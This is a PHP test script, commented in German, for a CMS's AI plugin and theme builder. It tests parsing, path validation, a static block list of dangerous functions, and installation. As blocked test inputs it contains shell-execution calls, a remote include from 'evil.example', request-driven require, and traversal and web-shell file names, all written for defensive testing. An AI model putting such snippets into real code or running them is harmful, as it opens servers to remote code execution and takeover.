<?php
// Prüft den KI-Entwickler (cms/src/Ai/CodeBuilder.php) mit Fake-Transport (kein Netz): Parsen der Dateiblöcke, Pfad- und Dateiprüfung, PHP-Syntax (Tokenizer),
// statische Prüfung auf gefährliche Funktionen (Fehler/Warnungen), Kindtheme-Regeln und die inaktive Installation. Aufruf: php scripts/test-ai-codebuilder.php
declare(strict_types=1);
require __DIR__.'/../cms/src/autoload.php';
use Elvado\Ai\{AiGatewayConfig,AiGatewayService,AiGatewayException,CodeBuilder};use Elvado\Support\{Http,HttpResponse};
$fail=0;$n=0;
function t(string $name,bool $ok,string $extra=''): void { global $fail,$n; $n++; if(!$ok){$fail++;echo "FEHLER: $name $extra\n";} }
function thr(callable $f,string $needle=''): ?AiGatewayException { try{ $f();return null; }catch(AiGatewayException $e){ return ($needle===''||str_contains($e->getMessage(),$needle))?$e:null; } }
$tmp=sys_get_temp_dir().'/rrw-cb-'.bin2hex(random_bytes(4));mkdir($tmp);
$hdr="<?php\n/*\nPlugin Name: Hallo Plugin\nDescription: Test\nVersion: 1.0.0\nLicense: GPL-2.0-or-later\n*/\nif (!defined('ABSPATH')) { exit; }\n";
$good=$hdr."function hallo_plugin_sc(){ return '<p>'.esc_html__('Hallo','hallo-plugin').'</p>'; }\nadd_shortcode('hallo', 'hallo_plugin_sc');\n";
$ai=fn(string $body)=>"TITEL: Hallo Plugin\nBESCHREIBUNG: Gibt Hallo aus.\n".$body."HINWEISE:\n- Shortcode [hallo] einfügen\n- Zweiter Hinweis\n";
$file=fn(string $p,string $c)=>"=== DATEI: $p ===\n$c\n=== ENDE ===\n";
$plan=CodeBuilder::parse($ai($file('hallo-plugin/hallo-plugin.php',$good).$file('hallo-plugin/assets/style.css','.hallo{color:#333}')),'plugin',false);
t('Parsen: Ordnername, Titel, Dateien ohne Ordnerpräfix, Hinweise',$plan['slug']==='hallo-plugin'&&$plan['title']==='Hallo Plugin'&&array_column($plan['files'],'path')===['hallo-plugin.php','assets/style.css']&&count($plan['notes'])===2);
t('Gültiges Plugin: ok, keine Fehler und Warnungen',$plan['ok']===true&&$plan['errors']===[]&&$plan['warnings']===[],json_encode([$plan['errors'],$plan['warnings']]));
$fenced=CodeBuilder::parse($ai("=== DATEI: hallo-plugin/hallo-plugin.php ===\n```php\n".$good."\n```\n=== ENDE ===\n"),'plugin',false);
t('Markdown-Zaun um den Code wird entfernt',$fenced['ok']===true&&str_starts_with($fenced['files'][0]['content'],'<?php'));
t('Vorhandener Ordnername → Zähler',CodeBuilder::parse($ai($file('hallo-plugin/hallo-plugin.php',$good)),'plugin',false,['hallo-plugin'])['slug']==='hallo-plugin-2');
t('Überarbeitung behält den Ordnernamen',CodeBuilder::parse($ai($file('hallo-plugin/hallo-plugin.php',$good)),'plugin',false,['hallo-plugin'],'hallo-plugin')['slug']==='hallo-plugin');
t('Antwort ohne Dateien → verständlicher Fehler',thr(fn()=>CodeBuilder::parse('Das ist nur Text','plugin',false),'keine Dateien')!==null);
$chk=function(string $code,string $kind='plugin') use($hdr){return CodeBuilder::check(['kind'=>$kind,'slug'=>'hallo-plugin','files'=>[['path'=>'hallo-plugin.php','content'=>$hdr.$code]]]);};
foreach(['eval("1");'=>'eval','exec("ls");'=>'exec','system("ls");'=>'system','shell_exec("ls");'=>'shell_exec','$x=`ls`;'=>'Backtick','passthru("x");'=>'passthru','popen("x","r");'=>'popen','assert("1");'=>'assert','include "http://evil.example/x.php";'=>'include','require $_GET["f"];'=>'include','mail("a@b.c","s","m");'=>'mail','fsockopen("x",80);'=>'fsockopen'] as $code=>$what){
    $r=$chk($code);t("Gefährlich blockiert: $what",$r['ok']===false&&$r['errors']!==[],$code);}
t('Syntaxfehler wird erkannt (Tokenizer)',$chk('function x( { }')['ok']===false&&str_contains(implode(' ',$chk('function x( { }')['errors']),'Syntaxfehler'));
t('Treffer in Kommentaren und Zeichenketten sind harmlos',$chk("// exec('x')\n\$s='system(1)'; /* eval(1) */ \$t=\"shell_exec\";")['ok']===true);
t('Methoden und statische Aufrufe mit gleichem Namen sind harmlos',$chk('class A{function exec(){} static function system(){}} $a=new A; $a->exec(); A::system();')['ok']===true);
foreach(['file_put_contents("x","y");'=>'schreibt Dateien','$r=wp_remote_get("https://x.example");'=>'Netz','$f="strlen"; $f("a");'=>'dynamischer','unserialize($x);'=>'serialisierte','$y=base64_decode("QQ==");'=>'dekodiert','extract($a);'=>'überschreibt'] as $code=>$what){
    $r=$chk($code);t("Warnung: $what",$r['ok']===true&&$r['warnings']!==[]&&str_contains(implode(' ',$r['warnings']),explode(' ',$what)[0]),json_encode($r['warnings']));}
$pf=fn(array $files,string $kind='plugin',bool $child=false)=>CodeBuilder::check(['kind'=>$kind,'slug'=>'x-test','child'=>$child,'files'=>$files]);
t('Ohne Plugin-Kopf: Fehler',$pf([['path'=>'x-test.php','content'=>"<?php\necho 1;"]])['ok']===false);
foreach(['../evil.php','.htaccess','a b.php','x.exe','Ordner/../x.php','/abs.php','shell.phtml'] as $bad)t("Pfad abgelehnt: $bad",$pf([['path'=>$bad,'content'=>'x'],['path'=>'x-test.php','content'=>$hdr]])['ok']===false);
t('PHP-Code in CSS/JS/HTML abgelehnt',$pf([['path'=>'x-test.php','content'=>$hdr],['path'=>'a.css','content'=>"<?php echo 1; ?>"]])['ok']===false);
t('JS: eval blockiert, Netzwerk warnt',$pf([['path'=>'x-test.php','content'=>$hdr],['path'=>'a.js','content'=>'eval("1")']])['ok']===false&&$pf([['path'=>'x-test.php','content'=>$hdr],['path'=>'a.js','content'=>'fetch("https://x.example/a")']])['warnings']!==[]);
t('CSS: expression blockiert, @import warnt',$pf([['path'=>'x-test.php','content'=>$hdr],['path'=>'a.css','content'=>'a{width:expression(1)}']])['ok']===false&&$pf([['path'=>'x-test.php','content'=>$hdr],['path'=>'a.css','content'=>'@import url(https://x.example/f.css);']])['warnings']!==[]);
t('Größenlimits (Datei, Anzahl)',$pf([['path'=>'x-test.php','content'=>$hdr.str_repeat('//x'.PHP_EOL,60000)]])['ok']===false&&$pf(array_map(fn($i)=>['path'=>"f$i.txt",'content'=>'x'],range(1,14)))['ok']===false);
// Themes
$css="/*\nTheme Name: Holz\nTemplate: elvado-baukasten\nVersion: 1.0.0\n*/\n:root{--accent:#8b5a2b}";
t('Kindtheme: nur style.css mit Template erlaubt',$pf([['path'=>'style.css','content'=>$css]],'theme',true)['ok']===true);
t('Kindtheme: PHP-Datei oder fehlendes Template abgelehnt',$pf([['path'=>'style.css','content'=>$css],['path'=>'functions.php','content'=>"<?php\n"]],'theme',true)['ok']===false&&$pf([['path'=>'style.css','content'=>"/*\nTheme Name: X\n*/"]],'theme',true)['ok']===false);
t('Eigenständiges Theme braucht style.css und index.php',$pf([['path'=>'style.css','content'=>"/*\nTheme Name: X\n*/"],['path'=>'index.php','content'=>"<?php get_header();"]],'theme',false)['ok']===true&&$pf([['path'=>'style.css','content'=>"/*\nTheme Name: X\n*/"]],'theme',false)['ok']===false);
// Installation
$pd=$tmp.'/plugins';$td=$tmp.'/themes';
$p1=CodeBuilder::parse($ai($file('hallo-plugin/hallo-plugin.php',$good).$file('hallo-plugin/assets/style.css','.hallo{color:#333}')),'plugin',false);
$r=CodeBuilder::install($p1,$pd,$td,'admin');
t('Installation schreibt Dateien in plugins/<slug>, Markierung und index.php, räumt tmp auf',is_file($pd.'/hallo-plugin/hallo-plugin.php')&&is_file($pd.'/hallo-plugin/assets/style.css')&&is_file($pd.'/hallo-plugin/.ai-generated.json')&&is_file($pd.'/hallo-plugin/index.php')&&$r['updated']===false&&!glob($pd.'/.tmp-ai-*'));
$p2=$p1;$p2['files'][0]['content'].="\n// v2\n";$r2=CodeBuilder::install($p2,$pd,$td,'admin');
t('Erneute Installation ersetzt den eigenen Ordner (updated)',$r2['updated']===true&&str_contains((string)file_get_contents($pd.'/hallo-plugin/hallo-plugin.php'),'// v2')&&!glob($pd.'/*.old-*'));
mkdir($pd.'/fremd');file_put_contents($pd.'/fremd/fremd.php','x');$p3=$p1;$p3['slug']='fremd';
t('Fremder Ordner ohne Markierung wird nie überschrieben',thr(fn()=>CodeBuilder::install($p3,$pd,$td),'nicht von der KI')!==null&&(string)file_get_contents($pd.'/fremd/fremd.php')==='x');
$pw=$p1;$pw['slug']='warn-plugin';$pw['files'][0]['content'].="\nfile_put_contents('/tmp/x','y');\n";
t('Warnungen: ohne Bestätigung abgelehnt (409), mit Bestätigung installiert',thr(fn()=>CodeBuilder::install($pw,$pd,$td))?->httpStatus()===409&&!is_dir($pd.'/warn-plugin')&&CodeBuilder::install($pw,$pd,$td,'admin',true)['slug']==='warn-plugin'&&is_dir($pd.'/warn-plugin'));
$pe=$p1;$pe['slug']='boese-plugin';$pe['files'][0]['content'].="\nexec('ls');\n";
t('Fehler blockieren die Installation auch bei manipuliertem Entwurf (Server prüft erneut)',thr(fn()=>CodeBuilder::install($pe,$pd,$td,'admin',true),'abgelehnt')!==null&&!is_dir($pd.'/boese-plugin'));
$th=CodeBuilder::parse($ai($file('holz/style.css',$css)),'theme',true);$rt=CodeBuilder::install($th,$pd,$td);
t('Theme landet in themes/<slug> (ohne index.php-Zusatz)',$rt['kind']==='theme'&&is_file($td.'/holz/style.css')&&!is_file($td.'/holz/index.php'));
// Anfrage ans Gateway
$calls=[];$answer='';
Http::useTransport(function(string $m,string $u,array $h,?string $b,array $o) use(&$calls,&$answer): HttpResponse { $calls[]=['u'=>$u,'b'=>$b?json_decode($b,true):null,'o'=>$o];return new HttpResponse(200,json_encode(['choices'=>[['message'=>['content'=>$answer]]],'usage'=>['prompt_tokens'=>1,'completion_tokens'=>2]])); });
$cfg=AiGatewayConfig::load($tmp.'/cfg');$cfg->save(['providers'=>['groq'=>['api_key'=>'gsk-test-key-1234']],'purposes'=>['developer'=>'groq']]);$cfg=AiGatewayConfig::load($tmp.'/cfg');
$cb=new CodeBuilder(new AiGatewayService($cfg));
$answer=$ai($file('hallo-plugin/hallo-plugin.php',$good));
$pl=$cb->plan(['kind'=>'plugin','prompt'=>'Ein Plugin, das über den Shortcode [hallo] einen Gruß ausgibt.','existing'=>[]]);
t('Anfrage: Anbieter des Zwecks „KI-Entwickler“, Aufgabe code mit großem Rahmen und Formatvorgabe',str_contains($calls[0]['u'],'api.groq.com')&&$calls[0]['b']['max_tokens']===12000&&str_contains($calls[0]['b']['messages'][0]['content'],'=== DATEI:')&&str_contains($calls[0]['b']['messages'][0]['content'],'Plugin Name')&&$calls[0]['o']['timeout']===150);
t('Entwurf kommt geprüft zurück (meta, ok)',$pl['ok']===true&&$pl['meta']['provider']==='groq'&&$pl['slug']==='hallo-plugin');
$cb->plan(['kind'=>'widget','prompt'=>'Ein Widget, das einen Spruch des Tages anzeigt, mit Shortcode.']);
t('Widget-Auftrag verlangt WP_Widget und Shortcode',str_contains($calls[1]['b']['messages'][0]['content'],'WP_Widget')&&str_contains($calls[1]['b']['messages'][0]['content'],'Shortcode'));
$answer=$ai($file('holz/style.css',$css));$cb->plan(['kind'=>'theme','prompt'=>'Warmes Holz-Design in Braun- und Beigetönen für die Website.','base'=>'child']);$cb->plan(['kind'=>'theme','prompt'=>'Warmes Holz-Design in Braun- und Beigetönen für die Website.','base'=>'standalone']);
t('Theme: Kindtheme nur CSS, eigenständig mit PHP-Templates',str_contains($calls[2]['b']['messages'][0]['content'],'NUR eine Datei')&&str_contains($calls[3]['b']['messages'][0]['content'],'index.php'));
$answer=$ai($file('hallo-plugin/hallo-plugin.php',$good));
$cb->plan(['kind'=>'plugin','prompt'=>'Ein Plugin, das über den Shortcode [hallo] einen Gruß ausgibt.','previous'=>$pl['files'],'instruction'=>'Mach den Gruß fett.','slug'=>'hallo-plugin','existing'=>['hallo-plugin']]);
$last=$calls[count($calls)-1]['b']['messages'][1]['content'];
t('Überarbeitung schickt den bisherigen Stand und den Wunsch mit',str_contains($last,'Bisheriger Stand')&&str_contains($last,'hallo_plugin_sc')&&str_contains($last,'Mach den Gruß fett'));
t('Zu kurze Beschreibung und unbekannte Art werden ohne Anfrage abgelehnt',thr(fn()=>$cb->plan(['kind'=>'plugin','prompt'=>'Hallo']),'genauer')!==null&&thr(fn()=>$cb->plan(['kind'=>'virus','prompt'=>'Eine ausreichend lange Beschreibung hier']),'Plugin, Widget oder Theme')!==null);
t('Nur interne Aufrufer dürfen die Aufgabe „code“ nutzen',thr(fn()=>(new AiGatewayService($cfg))->generate(['provider'=>'groq','task'=>'code','prompt'=>'x']),'Unbekannte Aufgabe')!==null);
$cb->plan(['kind'=>'plugin','prompt'=>'Ein Plugin, das über den Shortcode [hallo] einen Gruß ausgibt.','existing'=>[],'provider'=>'groq','model'=>'wunsch-modell-1']);
t('Gewähltes Modell wird an den Anbieter gesendet',end($calls)['b']['model']==='wunsch-modell-1');
Http::useTransport(null);
system('rm -rf '.escapeshellarg($tmp));
echo $fail?"$fail von $n fehlgeschlagen\n":"$n von $n Prüfungen bestanden\n";exit($fail?1:0);
